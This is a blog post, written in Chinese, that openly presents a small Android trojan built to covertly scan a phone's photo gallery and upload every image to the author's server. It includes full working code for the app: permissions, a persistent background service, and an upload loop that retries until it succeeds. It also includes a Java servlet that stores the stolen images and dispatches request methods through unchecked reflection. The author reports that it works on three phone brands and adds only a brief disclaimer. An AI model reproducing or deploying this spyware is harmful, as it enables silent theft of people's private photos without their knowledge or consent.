---
title: Android偷偷扫描用户手机相册并上传至服务器
date: 2016-9-13 17:33:01
categories: Hack
tags:
- Android
- 偷取用户相册
---
<Excerpt in index | 首页摘要> 
>Android偷偷扫描用户手机相册并上传至服务器

<!-- more -->
<The rest of contents | 余下全文>  
  
G20放假的时候写的一个小木马.功能主要就是偷取当前用户所有图片.

<font color='red'>技术无罪,滥用者后果自负.</font>

##概述
很简单的小东西,主要就是读取当前本地相册所有图片路径,然后遍历上传.  
  
主要现在Android对相册的读取还没有权限的限制,所以这个小木马的可行性还是比较高的.
  
##实现-Android
必要权限与声明
```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />

<service
    android:name=".ImgService"
    android:process="com.gloomyer.img" />

```
主Actvitiy里面启动Service
```java
startService(new Intent(this, ImgService.class));
```
这边上传是用的[okhttp](https://github.com/square/okhttp),封装库使用的是[okhttputils](https://github.com/hongyangAndroid/okhttputils)
  
ImgService代码
```java
public class ImgService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
		//启动一个异步任务来读取本地相册所有图片
        new ImageAsyncTask(this).execute(uri);
        return super.onStartCommand(intent, START_STICKY, startId);
    }
}
```
ImageAsyncTask代码:
```java
public class ImageAsyncTask extends AsyncTask<Uri, Void, Boolean> {
    private Context mContext;
    private HashMap<String, List<String>> mData;
    private ArrayList<FolderEntity> mFolder;

    public ImageAsyncTask(Context context) {
        this.mContext = context;
        this.mData = new HashMap<>();
        this.mFolder = new ArrayList<>();
    }


    @Override
    protected void onPostExecute(Boolean aBoolean) {
        Log.i("folder", mData.toString());
        new Thread() {
            @Override
            public void run() {
				//遍历上传图片
                Set<String> keys = mData.keySet();
                for (String key : keys) {
                    List<String> imgs = mData.get(key);
                    for (String img : imgs) {
                        HashMap<String, File> map = new HashMap<>();

                        String name = "";
                        try {
                            name = img.substring(img.lastIndexOf("/") + 1);
                        } catch (Exception e) {
                            name = "";
                        }
                        map.put(name, new File(img));
                        RequestCall build = OkHttpUtils.post()
                                .url(Net.PAY + "?method=uploadImg")
                                .files("img", map)
                                .build();
                        upload(build);
                    }
                }
            }


        }.start();
    }

    private void upload(final RequestCall build) {
        build.execute(new StringCallback() {
            @Override
            public void onError(Call call, Exception e, int id) {
                upload(build);
            }

            @Override
            public void onResponse(String response, int id) {

            }
        });
    }

    @Override
    protected Boolean doInBackground(Uri... params) {
        return getImages(params[0]);
    }

    private Boolean getImages(Uri param) {
        ContentResolver contentResolver = mContext.getContentResolver();
        String selection = MediaStore.Images.Media.MIME_TYPE + "=? or " + MediaStore.Images.Media.MIME_TYPE + "=?";
        Cursor cursor = contentResolver.query(param, null, selection, new String[]{"image/jpeg", "image/png"}, MediaStore.Images.Media.DEFAULT_SORT_ORDER);
        if (cursor == null) {
            return false;
        }
        while (cursor.moveToNext()) {
            String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
            String ParentName = new File(path).getParentFile().getName();
            if (!mData.containsKey(ParentName)) {
                List<String> childList = new ArrayList<>();
                childList.add(path);
                mData.put(ParentName, childList);
            } else {
                mData.get(ParentName).add(path);
            }
        }
        mFolder.addAll(getFolder(mData));
        cursor.close();
        return true;
    }

    public ArrayList<FolderEntity> getFolder(HashMap<String, List<String>> mData) {
        ArrayList<FolderEntity> folder = new ArrayList<>();
        Iterator<Map.Entry<String, List<String>>> iterator = mData.entrySet().iterator();
        while (iterator.hasNext()) {
            FolderEntity entity = new FolderEntity();
            Map.Entry<String, List<String>> next = iterator.next();
            entity.folderName = next.getKey();
            entity.count = next.getValue().size();
            folder.add(entity);
        }
        return folder;
    }
}
```

##实现-JaveWeb(后台)
Servlet实现代码
依赖两个库(apache的)
commons-io-2.5.jar
commons-fileupload-1.3.2.jar
```java
@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    doPost(req, resp);
}

@Override
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    String method = req.getParameter("method");
    try {
        Method m = getClass().getDeclaredMethod(method, HttpServletRequest.class, HttpServletResponse.class);
        m.invoke(this, req, resp);
    } catch (Exception e) {
        e.printStackTrace();
    }
}

public void uploadImg(HttpServletRequest req, HttpServletResponse resp) {
    // 创建硬盘文件项工厂
    DiskFileItemFactory factory = new DiskFileItemFactory();
    // 创建Servlet 文件上传项
    ServletFileUpload uploadFile = new ServletFileUpload(factory);
    // 全局化filePath,方便上传失败后的操作
    File filePath = null;
    // 判断上传的是否是 multipart/form-data 类型数据
    if (uploadFile.isMultipartContent(req)) {
        try {
            // 获取到上传的文件map集合
            Map<String, List<FileItem>> fileMap = uploadFile.parseParameterMap(req);
            // 获取file指向的文件
            List<FileItem> fileList = fileMap.get("img");
            for (FileItem fileItem : fileList) {
                // 创建一个uuid,作为该文件的唯一标示
                String uuid = UUID.randomUUID().toString().replace("-", "");
                // 获取上传资源的文件名
                String fileName = fileItem.getName();
                // 根据文件名获取hashCode
                String hash = Math.abs(fileName.hashCode()) + "";
                // 获取资源存放路径,并且进行hash打散
                File uploadDir = new File("D:/Hack/img/");
                // 如果资源存放路径不存在,就创建资源路径
                if (!uploadDir.exists())
                    uploadDir.mkdirs();
                // 设置要写出的完整路径(加上uuid避免文件重复问题)
                String substring;
                try {
                    substring = fileName.substring(fileName.lastIndexOf(".") + 1);
                } catch (Exception e) {
                    substring = "jpg";
                }
                filePath = new File(uploadDir, uuid + "." + substring);
                // 获取输入流
                InputStream is = fileItem.getInputStream();
                // 写出文件
                FileOutputStream fos = new FileOutputStream(filePath);
                byte[] buffer = new byte[1024];
                int len = -1;
                while ((len = is.read(buffer)) > 0) {
                    fos.write(buffer, 0, len);
                }
                // 释放资源
                is.close();
                fos.flush();
                fos.close();
            }

        } catch (Exception e) {
            e.printStackTrace();
            // 如果出现异常,那么就表示上传失败,那么判断上传的文件是否已经生成,如果已经生成,就删除他
            if (filePath != null && filePath.exists())
                filePath.delete();
        }
    }
}
```

##测试结果
小米		OK  
魅族		OK  
锤子		OK  